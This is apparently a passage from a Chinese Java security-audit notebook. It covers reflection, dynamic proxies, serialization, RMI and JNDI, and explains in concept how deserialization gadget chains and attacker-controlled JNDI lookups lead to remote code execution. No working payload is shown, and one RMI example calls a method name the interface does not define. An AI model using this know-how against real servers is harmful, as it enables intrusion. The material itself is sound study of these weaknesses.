System.out.println(Arrays.toString(cls.getDeclaredMethods())); // 获取当前类的所有Method（不包括父类） System.out.println(cls.getMethod(\"echoEver\", String.class)); // 获取某个public的Method（包括父类） //.getMethod(方法名，这个方法的参数类型) System.out.println(cls.getDeclaredMethod(\"echoEver\", String.class)); // 获取当前类的某个Method（不包括父类） } } class OtherTest{ public void echoEver(String thing){ System.out.println(thing); } } // ===== /* [public void org.example.OtherTest.echoEver(java.lang.String), public final void java.lang.Object.wait(long,int) throws java.lang.InterruptedException, public final native void java.lang.Object.wait(long) throws java.lang.InterruptedException, public final void java.lang.Object.wait() throws java.lang.InterruptedException, public boolean java.lang.Object.equals(java.lang.Object), public java.lang.String java.lang.Object.toString(), public native int java.lang.Object.hashCode(), public final native java.lang.Class java.lang.Object.getClass(), public final native void java.lang.Object.notify(), public final native void java.lang.Object.notifyAll()] [public void org.example.OtherTest.echoEver(java.lang.String)] public void org.example.OtherTest.echoEver(java.lang.String) public void org.example.OtherTest.echoEver(java.lang.String) */ 调用方法 获取Class实例 反射获取方法 invoke调用方法 package org.example; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class App { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { OtherTest ot = new OtherTest(); Class cls = ot.getClass(); Method echoEver = cls.getDeclaredMethod(\"echoEver\", String.class); echoEver.setAccessible(true); echoEver.invoke(ot,\"test\"); // 第一个参数是调用该方法的对象，第二个参数是一个可变长参数，是这个方法的需要传入的参数 } } class OtherTest{ private void echoEver(String thing){ System.out.println(thing); } } 小结 Java的反射API提供的Method对象封装了方法的所有信息： 通过Class实例的方法可以获取Method实例：getMethod()，getMethods()，getDeclaredMethod()，getDeclaredMethods()； 通过Method实例可以获取方法信息：getName()，getReturnType()，getParameterTypes()，getModifiers()； 通过Method实例可以调用某个对象的方法：Object invoke(Object instance, Object... parameters)； 通过设置setAccessible(true)来访问非public方法； 通过反射调用方法时，仍然遵循多态原则。 调用构造方法 举例 我们通常使用new操作符创建新的实例： Person p = new Person(); 如果通过反射来创建新的实例，可以调用Class提供的newInstance()方法： Person p = Person.class.newInstance(); 调用Class.newInstance()的局限是，它只能调用该类的public无参数构造方法。如果构造方法带有参数，或者不是public，就无法直接通过Class.newInstance()来调用。 为了调用任意的构造方法，Java的反射API提供了Constructor对象，它包含一个构造方法的所有信息，可以创建一个实例。Constructor对象和Method非常类似，不同之处仅在于它是一个构造方法，并且，调用结果总是返回实例： package org.example; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.util.Arrays; public class App { public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { Class cls = Integer.class; System.out.println(cls.getName()); System.out.println(Arrays.toString(cls.getConstructors())); // Integer.class.getConstructor(int.class); Constructor cons1 = cls.getConstructor(int.class); Integer int1 = cons1.newInstance(123); System.out.println(int1); Constructor cons2 = cls.getConstructor(String.class); System.out.println(cons2.newInstance(\"456\")); } } /* java.lang.Integer [public java.lang.Integer(int), public java.lang.Integer(java.lang.String) throws java.lang.NumberFormatException] 123 456 */ 通过Class实例获取Constructor的方法如下： getConstructor(Class...)：获取某个public的Constructor； getDeclaredConstructor(Class...)：获取某个Constructor； getConstructors()：获取所有public的Constructor； getDeclaredConstructors()：获取所有Constructor。 注意Constructor总是当前类定义的构造方法，和父类无关，因此不存在多态的问题。 调用非public的Constructor时，必须首先通过setAccessible(true)设置允许访问。setAccessible(true)可能会失败。 小结 Constructor对象封装了构造方法的所有信息； 通过Class实例的方法可以获取Constructor实例：getConstructor()，getConstructors()，getDeclaredConstructor()，getDeclaredConstructors()； 通过Constructor实例可以创建一个实例对象：newInstance(Object... parameters)； 通过设置setAccessible(true)来访问非public构造方法。 获取继承关系 获取父类class和interface import java.util.Arrays; public class Test{ public static void main(String[] args) { OtherTest ot = new OtherTest(\"emm\"); Class cls = ot.getClass(); System.out.println(cls.getSuperclass()); // 获取父类class System.out.println(Arrays.toString(cls.getInterfaces())); // 获取接口 System.out.println(\"\".getClass().getSuperclass()); // 获取 String 的父类 } } class OtherTest extends Emmm implements Aaa{ private String name; public OtherTest(String name){ this.name = name; } @Override public void echo() { System.out.println(\"666\"); } } class Emmm { private int aa; } interface Aaa{ public void echo(); } /* class org.example.Emmm [interface org.example.Aaa] class java.lang.Object */ 小结 通过Class对象可以获取继承关系： Class getSuperclass()：获取父类类型； Class[] getInterfaces()：获取当前类实现的所有接口。 通过Class对象的isAssignableFrom()方法可以判断一个向上转型是否可以实现。 动态代理 有没有可能不编写实现类，直接在运行期创建某个interface的实例呢？ 这是可能的，因为Java标准库提供了一种动态代理（Dynamic Proxy）的机制：可以在运行期动态创建某个interface的实例。 所谓动态代理，是和静态相对应的。我们来看静态代码怎么写： // 创建接口 public interface Hello { void morning(String name); } // 实现接口Hello public class HelloWorld implements Hello { public void morning(String name) { System.out.println(\"Good morning, \" + name); } } // 创建实例，调用 public static void main(String[] args) { Hello hello = new HelloWorld(); hello.morning(\"Bob\"); } 动态如下 过程 ，不需要单独实现接口，而是动态实现接口。 过程 在运行期动态创建一个interface实例的方法如下： 定义一个InvocationHandler实例，它负责实现接口的方法调用； 通过Proxy.newProxyInstance()创建interface实例，它需要3个参数： 使用的ClassLoader，通常就是接口类的ClassLoader； 需要实现的接口数组，至少需要传入一个接口进去； 用来处理接口方法调用的InvocationHandler实例。 将返回的Object强制转型为接口。 package org.example; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; public class App{ public static void main(String[] args) { InvocationHandler handler = new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(method); System.out.println(args.length); // 实现对应的方法 if (method.getName().equals(\"echo\")){ System.out.println(args[0]); } return null; } }; Hello hello = (Hello) Proxy.newProxyInstance(Hello.class.getClassLoader(), new Class[]{Hello.class}, handler); hello.echo(\"9999\"); } } interface Hello{ public void echo(String s); } /* 1 9999 */ 小结 Java标准库提供了动态代理功能，允许在运行期动态创建一个接口的实例； 动态代理是通过Proxy创建代理对象，然后将接口方法“代理”给InvocationHandler完成的。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/1.审计基础/03.Java序列化与反序列化.html":{"url":"个人知识库/02.代码审计/01.Java安全/1.审计基础/03.Java序列化与反序列化.html","title":"03.Java序列化与反序列化","keywords":"","body":" Java 序列化和反序列化 介绍 什么是序列化和反序列化 序列化要求 其他 序列化步骤 反序列化步骤 代码举例 序列化和反序列化 --> 文件 序列化和反序列化 --> bytes数组 序列化特征 安全性 反序列化漏洞的攻击流程 漏洞挖掘 Java 序列化和反序列化 介绍 序列化和反序列化都是在对象的基础上进行的！！！ 必须要 implements Serializable 的类才可以序列化和反序列化 什么是序列化和反序列化 java的序列化机制就是为了持久化存储某个对象或者在网络上传输某个对象。我们都知道，一旦jvm关闭，那么java中的对象也就销毁了，所以要想保存它，就需要把他转换为字节序列写到某个文件或是其它哪里。 Java 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。即序列化是指把一个Java对象变成二进制内容，本质上就是一个byte[]数组。 为什么要把Java对象序列化呢？因为序列化后可以把byte[]保存到文件中，或者把byte[]通过网络传输到远程，这样，就相当于把Java对象存储到文件或者通过网络传输出去了。 将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，即把一个二进制内容（也就是byte[]数组）变回Java对象。有了反序列化，保存到文件中的byte[]数组又可以“变回”Java对象，或者从网络上读取byte[]并把它“变回”Java对象。也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。 整个过程都是 Java 虚拟机（JVM）独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。 Java的序列化机制仅适用于Java，如果需要与其它语言交换数据，必须使用通用的序列化方法，例如JSON。 序列化要求 一个Java对象要能序列化，必须实现一个特殊的java.io.Serializable接口，它的定义如下： public interface Serializable { } Serializable接口没有定义任何方法，它是一个空接口。我们把这样的空接口称为“标记接口”（Marker Interface），实现了标记接口的类仅仅是给自身贴了个“标记”，并没有增加任何方法。 其他 类 ObjectInputStream 和 ObjectOutputStream 是高层次的数据流，它们包含反序列化和序列化对象的方法。 ObjectOutputStream 类包含很多写方法来写各种数据类型，但是一个特别的方法例外： public final void writeObject(Object x) throws IOException 上面的方法序列化一个对象，并将它发送到输出流。相似的 ObjectInputStream 类包含如下反序列化一个对象的方法： public final Object readObject() throws IOException, ClassNotFoundException 该方法从流中取出下一个对象，并将对象反序列化。它的返回值为Object，因此，你需要将它转换成合适的数据类型。 序列化步骤 把对象转换为字节序列 步骤一：创建一个ObjectOutputStream输出流； 步骤二：调用ObjectOutputStream对象的writeObject输出可序列化对象。 反序列化步骤 把字节序列转换为对象 步骤一：创建一个ObjectInputStream输入流； 步骤二：调用ObjectInputStream对象的readObject()得到序列化的对象。 代码举例 序列化和反序列化 --> 文件 package org.example; import java.io.*; public class App{ public static void main(String[] args) throws IOException, ClassNotFoundException { SerializeDemo serializeDemo = new SerializeDemo(); serializeDemo.x = 666; // 序列化 // 创建一个FileOutputStream，且将这个FileOutputStream封装到ObjectOutputStream中 ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"123.ser\")); // 调用writeObject方法，序列化对象到文件123.ser中 objectOutputStream.writeObject(serializeDemo); objectOutputStream.close(); // 反序列化 // 创建一个FIleInutputStream，并将FileInputStream封装到ObjectInputStream中 try (ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\"123.ser\"))) { // 调用readObject从123.ser中反序列化出对象，还需要进行一下类型转换，默认是Object类型 SerializeDemo ss = (SerializeDemo) objectInputStream.readObject(); System.out.println(ss.add(1,2)); } } } class SerializeDemo implements Serializable { // 必须要实现Serializable这个接口，可以不用里面的方法 public int x; public int add(int a,int b){ return a+b+x; } } 这里要注意以下要点： readObject() 方法中的 try/catch代码块尝试捕获 ClassNotFoundException 异常。对于 JVM 可以反序列化对象，它必须是能够找到字节码的类。如果JVM在反序列化对象的过程中找不到该类，则抛出一个 ClassNotFoundException 异常。 readObject() 方法的返回值被转化成 SerializeDemo引用。 序列化和反序列化 --> bytes数组 package org.example; import java.io.*; import java.util.Arrays; public class App{ public static void main(String[] args) throws IOException, ClassNotFoundException { SerializeDemo serializeDemo = new SerializeDemo(); serializeDemo.x = 666; // 序列化 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); // 本体 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); // 只是一个装饰器的作用 Filter模式，懂？ objectOutputStream.writeObject(serializeDemo); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // 反序列化 ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); SerializeDemo serializeDemo1 = (SerializeDemo)objectInputStream.readObject(); objectInputStream.close(); serializeDemo1.add(1,2); } } class SerializeDemo implements Serializable { // 必须要实现Serializable这个接口，可以不用里面的方法 public int x; public int add(int a,int b){ return a+b+x; } } /* [-84, -19, 0, 5, 115, 114, 0, 25, 111, 114, 103, 46, 101, 120, 97, 109, 112, 108, 101, 46, 83, 101, 114, 105, 97, 108, 105, 122, 101, 68, 101, 109, 111, -89, 103, -99, 60, 6, -29, 97, -91, 2, 0, 1, 73, 0, 1, 120, 120, 112, 0, 0, 2, -102] 669 */ 序列化特征 十六进制查看我们生成的123.ser # hexdump没有xxd直观 xxd 123.ser xxd显示的结果，中间那一栏是文件的十六进制显示，最右边是字符显示。这里需要注意的特征值就是16进制显示时的前32位： AC ED：STREAM_MAGIC，声明使用了序列化协议，从这里可以判断保存的内容是否为序列化数据。 （这是在黑盒挖掘反序列化漏洞很重要的一个点） 00 05：STREAM_VERSION，序列化协议版本。 安全性 因为Java的序列化机制可以导致一个实例能直接从byte[]数组创建，而不经过构造方法，因此，它存在一定的安全隐患。一个精心构造的byte[]数组被反序列化后可以执行特定的Java代码，从而导致严重的安全漏洞。 实际上，Java本身提供的基于对象的序列化和反序列化机制既存在安全性问题，也存在兼容性问题。更好的序列化方法是通过JSON这样的通用数据结构来实现，只输出基本类型（包括String）的内容，而不存储任何与代码相关的信息。 反序列化漏洞的攻击流程 客户端构造payload(有效载荷)，并进行一层层的封装，完成最后的exp（exploit-利用代码） exp发送到服务端，进入一个服务端自主重写（也可能是也有组件重写）的readobject函数，它会反序列化恢复我们构造的exp去形成一个恶意的数据格式exp_1（剥去第一层） 这个恶意数据exp_1在接下来的处理流程(可能是在自主重写的readobject中、也可能是在外面的逻辑中)，会执行一个exp_1这个恶意数据类的一个方法，在方法中会根据exp_1的内容进行函处理，从而一层层地剥去（或者说变形、解析）我们exp_1变成exp_2、exp_3...... 最后在一个可执行任意命令的函数中执行最后的payload，完成远程代码执行。 那么以上大概可以分成三个主要部分： payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等； 反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(如commons-collections利用链) 重写readObject：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数重写点 漏洞挖掘 java是支持自定义readObject与writeObject方法的，只要某个类中按照特定的要求实现了readObject方法，那么在反序列化的时候就会自动调用它，如果这个自定义的readObject方法里进行了一些危险操作，那么就会导致反序列化漏洞的发生了。 举例如下： 可以看到自定义的readObject的确执行了，不过真实的应用中危险操作比较隐蔽。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/1.审计基础/04.RMI基础.html":{"url":"个人知识库/02.代码审计/01.Java安全/1.审计基础/04.RMI基础.html","title":"04.RMI基础","keywords":"","body":" RMI概述 RMI实现机制 RMI实现举例 实现过程 实现举例 HelloInterface.java HelloImpl.java Server.java Client.java 注意事项 参考文章 RMI概述 RMI: 远程方法调用(Remote Method Invocation)，它支持存储于不同地址空间的程序级对象之间彼此进行通信，实现远程对象之间的无缝远程调用。 Java RMI：用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟机中的对象的方法（一个JVM中的代码可以通过网络实现远程调用另一个JVM的某个方法。），只不过是允许被远程调用的对象要通过一些标志加以标识。 提供服务的一方我们称之为服务器，而实现远程调用的一方我们称之为客户端。 具体实现方法： 远程服务器提供具体的类和方法，本地会通过某种方式获得远程类的一个代理，然后通过这个代理调用远程对象的方法，方法的参数是通过序列化与反序列化的方式传递的，所以： 只要服务端的对象提供了一个方法，这个方法接收的是一个Object类型的参数， 且远程服务器的classpath中存在可利用pop链，那么我们就可以通过在客户端调用这个方法，并传递一个精心构造的对象的方式来攻击rmi服务。 RMI实现机制 要实现RMI，服务器和客户端必须共享同一个接口。Java的RMI规定此接口必须派生自java.rmi.Remote，并在每个方法声明抛出RemoteException。 上面说了本地会通过某种方式获得远程对象的代理，那么具体是怎么的实现机制呢？RMI模式中除了有Client与Server，还借助了一个Registry(注册中心)。 因此，RMI由3个部分构成 第一个是rmiregistry（JDK提供的一个可以独立运行的程序，在bin目录下） 第二个是server端的程序，对外提供远程对象 第三个是client端的程序，想要调用远程对象的方法。 Server Registry Client 提供具体的远程对象 一个注册表，存放着远程对象的位置（ip、端口、标识符） 远程对象的使用者 其中Server与Registry可以在同一服务器上实现，也可以布置在不同服务器上，现在一个完整的RMI流程可以大概描述为： 启动Registry服务，启动时可以指定服务监听的端口，也可以使用默认的端口（1099）。 Server端在本地先实例化一个提供服务的实现类，然后通过RMI提供的 Naming/Context/Registry（下面实例用的Registry）等类的bind或rebind方法将刚才实例化好的实现类注册到RMI Registry上并对外暴露一个名称。 Client端通过本地的接口和一个已知的名称（即RMI Registry暴露出的名称）再使用RMI提供的Naming/Context/Registry等类的lookup方法从RMI Server那拿到实现类。这样虽然本地没有这个类的实现类，但所有的方法都在接口里了，便可以实现远程调用对象的方法了。 RMI的交互图： PS： 图中的stub就是客户端代理，skeleton就是服务端代理 远程方法调用的通信模式： RMI实现举例 实现过程 大概实现过程 定义远程接口 服务端实现远程接口 服务端注册远程对象 客户端调用接口 实现举例 HelloInterface.java // 定义一个远程接口 package com.company; import java.rmi.Remote; import java.rmi.RemoteException; public interface HelloInterface extends Remote { // 创建接口，必须继承Remote String say (String name) throws RemoteException; // 每个函数必须要抛出 RemoteException 异常 } HelloImpl.java // 实现远程接口 package com.company; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; // 必须要这个，不然会报序列化的错 public class HelloImpl extends UnicastRemoteObject implements HelloInterface { public HelloImpl() throws RemoteException { // 必须要这个 super(); } @Override public String say(String name) throws RemoteException { // 实现刚才定义的接口的方法 return \"test \" + name; } } Server.java // 创建一个注册表，并注册远程对象 package com.company; import java.net.MalformedURLException; import java.rmi.AlreadyBoundException; import java.rmi.Naming; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; //注册远程对象 public class Server { public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException { HelloInterface helloService = new HelloImpl(); LocateRegistry.createRegistry(1099); // 创建 System.setProperty(\"java.rmi.server.hostname\",\"127.0.0.1\"); // 绑定IP，默认是 127.0.0.1 Registry registry = LocateRegistry.getRegistry(); // 获取实例 registry.bind(\"test\",helloService); // 注册远程对象 //Naming.bind(\"test\",helloService); // 上面2行可以用这个替换 } } Client.java // 查找远程调用方法，并且调用远程方法 package com.company; import java.net.MalformedURLException; import java.rmi.Naming; import java.rmi.NotBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Client { public static void main( String[] args ) throws RemoteException, NotBoundException, MalformedURLException { // HelloInterface hello = (HelloInterface) Naming.lookup(\"rmi://127.0.0.1:1099/test\"); // 写法都可 Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\", 1099); HelloInterface hello = (HelloInterface) registry.lookup(\"test\"); System.out.println(hello.says(\"123123\")); } } 注意事项 接口需要继承Remote接口，且方法需要抛出RemoteException错误 接口的实现类需要继承UnicastRemoteObject，同样的方法需要抛出RemoteException错误 如果远程方法需要传参，需要保证参数是可序列化的，我这里传参只是传了字符串，字符串是可序列化的，如果传参是自定义的对象，那么这个对象需要实现Serilizable接口 如果服务端与客户端不在同一主机，需要保证调用的远程对象实现的远程接口在客户端与服务端都存在 参考文章 https://www.jianshu.com/p/5c6f2b6d458a https://blog.csdn.net/qq_28081453/article/details/83279066 https://www.cnblogs.com/fanghao/p/8918953.html https://www.liaoxuefeng.com/wiki/1252599548343744/1323711850348577 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/1.审计基础/05.JNDI注入.html":{"url":"个人知识库/02.代码审计/01.Java安全/1.审计基础/05.JNDI注入.html","title":"05.JNDI注入","keywords":"","body":" 背景知识 JNDI Service Provider ObjectFactory JNDI概述 JNDI类 InitialContext类 构造方法 常用方法 Reference类 构造方法 常用方法 JNDI代码实现 实现过程 实现举例 HelloInterface.class（定义远程接口） HelloImpl.class（HelloInterface远程接口实现类） Server.class（注册远程对象并绑定） Client.class（远程调用） JNDI动态协议转换 JNDI Naming Reference JNDI注入 JNDI注入原理 JNDI注入的利用条件 JNDI注入攻击流程 JNDI注入举例 创建恶意类Evil（不能带package） 常见RMI服务端，绑定恶意的Reference到rmi注册表 客户端远程调用evil对应类 步骤 JNDI注入Debug 绕过高版本JDK（8u191+）限制 关于Codebase 关于JNDI Naming Reference的限制 绕过高版本JDK限制：利用本地Class作为Reference Factory 利用举例 pom.xml（双方均需要） Server Client 几种变体的表达式 Debug分析 总结 绕过高版本JDK限制：利用LDAP返回序列化数据，触发本地Gadget 利用举例 生成POC LDAP Server Client Debug分析 调用栈 建议 参考 背景知识 JNDI Service Provider JNDI 与 JNDI Service Provider 的关系类似于 Windows 中 SSPI 与 SSP 的关系。前者是统一抽象出来的接口，而后者是对接口的具体实现。如默认的 JNDI Service Provider 有 RMI/LDAP 等等。 ObjectFactory 每一个 Service Provider 可能配有多个 Object Factory。Object Factory 用于将 Naming Service（如 RMI/LDAP）中存储的数据转换为 Java 中可表达的数据，如 Java 中的对象或 Java 中的基本数据类型。 JNDI 的注入的问题就出在了可远程下载自定义的 ObjectFactory 类上。你如果有兴趣的话可以完整看一下 Service Provider 是如何与多个 ObjectFactory 进行交互的。 JNDI概述 JNDI（Java Naming and Directory Interface，Java命名和目录接口）是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。 JNDI是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，就像人的名字或DNS中的域名与IP的关系。 JNDI由JNDI API、命名管理、JNDI SPI（service provider interface）服务提供的接口组成。我们的应用可以通过JNDI的API去访问相关服务提供的接口 JDNI的服务是可以拓展的，可以从JNDI页面下载其他服务提供商，也可以从远程获得其他服务提供商 JDK包括以下命名/目录服务的服务： 轻型目录访问协议（ldap） 通用对象请求代理体系结构（CORBA），通用对象服务（COS）名称服务 Java远程方法调用（RMI）注册表 域名服务（DNS） Java命名和目录接口（JNDI）是一种Java API，类似一个索引中心，它允许客户端通过name发现和查找数据和对象。其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等。 代码格式如下： //指定需要查找name名称 String jndiName= \"Test\"; //初始化默认环境 Context context = new InitialContext(); //查找该name的数据 DataSource ds = (DataSourse)context.lookup(jndiName); 这里的jndiName变量的值可以是上面的命名/目录服务列表里面的值，如果JNDI名称可控的话可能会被攻击。 那上面提到的命名和目录是什么？ 命名服务：命名服务是一种简单的键值对绑定，可以通过键名检索值，RMI就是典型的命名服务 目录服务：目录服务是命名服务的拓展。它与命名服务的区别在于它可以通过对象属性来检索对象 举个例子：比如你要在某个学校里里找某个人，那么会通过：年级->班级->姓名这种方式来查找，年级、班级、姓名这些就是某个人的属性，这种层级关系就很像目录关系，所以这种存储对象的方式就叫目录服务。LDAP是典型的目录服务 其实，仔细一琢磨就会感觉其实命名服务与目录服务的本质是一样的，都是通过键来查找对象，只不过目录服务的键要灵活且复杂一点。 在一开始很多人都会被jndi、rmi这些词汇搞的晕头转向，而且很多文章中提到了可以用jndi调用rmi，就更容易让人发昏了。我们只要知道jndi是对各种访问目录服务的逻辑进行了再封装，也就是以前我们访问rmi与ldap要写的代码差别很大，但是有了jndi这一层，我们就可以用jndi的方式来轻松访问rmi或者ldap服务，这样访问不同的服务的代码实现基本是一样的。一图胜千言： 从图中可以看到jndi在访问rmi时只是传了一个键foo过去，然后rmi服务端返回了一个对象，访问ldap这种目录服务时，传过去的字符串比较复杂，包含了多个键值对，这些键值对就是对象的属性，LDAP将根据这些属性来判断到底返回哪个对象。 JNDI类 在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是： //主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类； javax.naming //主要用于目录操作，它定义了DirContext接口和InitialDir- Context类； javax.naming.directory //在命名目录服务器中请求事件通知； javax.naming.event //提供LDAP支持； javax.naming.ldap //允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。 javax.naming.spi InitialContext类 在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。 构造方法 //构建一个初始上下文。 InitialContext() //构造一个初始上下文，并选择不初始化它。 InitialContext(boolean lazy) //使用提供的环境构建初始上下文。 InitialContext(Hashtable environment) 实现代码 InitialContext initialContext = new InitialContext(); 常用方法 //将名称绑定到对象。 bind(Name name, Object obj) //枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。 list(String name) //检索命名对象。 lookup(String name) //将名称绑定到对象，覆盖任何现有绑定。 rebind(String name, Object obj) //取消绑定命名对象。 unbind(String name) 实现代码 package org.example; import javax.naming.InitialContext; import javax.naming.NamingException; import java.rmi.RemoteException; public class Client { public static void main( String[] args ) throws NamingException, RemoteException { String uri = \"rmi://127.0.0.1:1099/test\"; InitialContext initialContext = new InitialContext(); HelloInterface helloInterface = (HelloInterface) initialContext.lookup(uri); System.out.println(helloInterface.says(\"hello\")); } } Reference类 该类也是在javax.naming的一个类，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。 在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。具体可以查看Java技术回顾之JNDI：命名和目录服务基本概念。 构造方法 //为类名为“className”的对象构造一个新的引用。 Reference(String className) //为类名为“className”的对象和地址构造一个新引用。 Reference(String className, RefAddr addr) //为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 Reference(String className, RefAddr addr, String factory, String factoryLocation) //为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。 Reference(String className, String factory, String factoryLocation) 实现代码 String url = \"http://127.0.0.1:8080\"; Reference reference = new Reference(\"test\", \"test\", url); 在使用Reference时，我们可以直接将对象传入构造方法中，当被调用时，对象的方法就会被触发，创建Reference实例时几个比较关键的属性： 参数1：className - 远程加载时所使用的类名 参数2：classFactory - 加载的class中需要实例化类的名称 参数3：classFactoryLocation - 提供classes数据的地址可以是file/ftp/http协议 Reference类表示对存在于命名/目录系统以外的对象的引用。如果远程获取 RMI 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。 Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。 补充 常用方法 void add(int posn, RefAddr addr) 将地址添加到索引posn的地址列表中。 void add(RefAddr addr) 将地址添加到地址列表的末尾。 void clear() 从此引用中删除所有地址。 RefAddr get(int posn) 检索索引posn上的地址。 RefAddr get(String addrType) 检索地址类型为“addrType”的第一个地址。 Enumeration getAll() 检索本参考文献中地址的列举。 String getClassName() 检索引用引用的对象的类名。 String getFactoryClassLocation() 检索此引用引用的对象的工厂位置。 String getFactoryClassName() 检索此引用引用对象的工厂的类名。 Object remove(int posn) 从地址列表中删除索引posn上的地址。 int size() 检索此引用中的地址数。 String toString() 生成此引用的字符串表示形式。 JNDI代码实现 在JNDI中提供了绑定和查找的方法 bind(Name name, Object obj) ：将名称绑定到对象中 lookup(String name)： 通过名字检索执行的对象 实现过程 类似rmi的实现过程，只不过最后绑定和检索的时候有一点差别。 定义远程接口 服务端实现远程接口 服务端注册远程对象 客户端调用接口 实现举例 HelloInterface.class（定义远程接口） package org.example; import java.rmi.Remote; import java.rmi.RemoteException; public interface HelloInterface extends Remote { String says (String name) throws RemoteException; } HelloImpl.class（HelloInterface远程接口实现类） package org.example; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class HelloImpl extends UnicastRemoteObject implements HelloInterface{ protected HelloImpl() throws RemoteException { } @Override public String says(String name) throws RemoteException { return \"test \" + name; } } Server.class（注册远程对象并绑定） package org.example; import javax.naming.Context; import javax.naming.InitialContext; import javax.naming.NamingException; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.util.Properties; public class Server { public static void main(String[] args) throws RemoteException, AlreadyBoundException, NamingException { //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常 Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY,\"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL,\"rmi://127.0.0.1:1099\"); //初始化环境 InitialContext ctx = new InitialContext(env); // 创建一个注册表 LocateRegistry.createRegistry(1099); // 远程调用对象 HelloInterface hello = new HelloImpl(); // 绑定 ctx.bind(\"test\", hello); } } Client.class（远程调用） package org.example; import javax.naming.InitialContext; import javax.naming.NamingException; import java.rmi.RemoteException; public class Client { public static void main( String[] args ) throws NamingException, RemoteException { //初始化环境 InitialContext init = new InitialContext(); //JNDI的方式获取远程对象 HelloInterface hello = (HelloInterface) init.lookup(\"rmi://127.0.0.1:1099/test\"); // 调用方法 System.out.println(hello.says(\"123\")); } } JNDI动态协议转换 我们上面的demo提前配置了jndi的初始化环境，还配置了Context.PROVIDER_URL，这个属性指定了到哪里加载本地没有的类，所以，上面的demo中 init.lookup(\"rmi://127.0.0.1:1099/test\")这一处代码改为init.lookup(\"test\")也是没啥问题的。 那么动态协议转换是个什么意思呢？其实就是说即使提前配置了Context.PROVIDER_URL属性，当我们调用lookup()方法时，如果lookup方法的参数像demo中那样是一个uri地址，那么客户端就会去lookup()方法参数指定的uri中加载远程对象，而不是去Context.PROVIDER_URL设置的地址去加载对象(如果感兴趣可以跟一下源码，可以看到具体的实现）。 正是因为有这个特性，才导致当lookup()方法的参数可控时，攻击者可以通过提供一个恶意的url地址来控制受害者加载攻击者指定的恶意类。 但是你以为直接让受害者去攻击者指定的rmi注册表加载一个类回来就能完成攻击吗，是不行的，因为受害者本地没有攻击者提供的类的class文件，所以是调用不了方法的，所以我们需要借助接下来要提到的东西。 JNDI Naming Reference Reference类表示对存在于命名/目录系统以外的对象的引用。如果远程获取 RMI 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 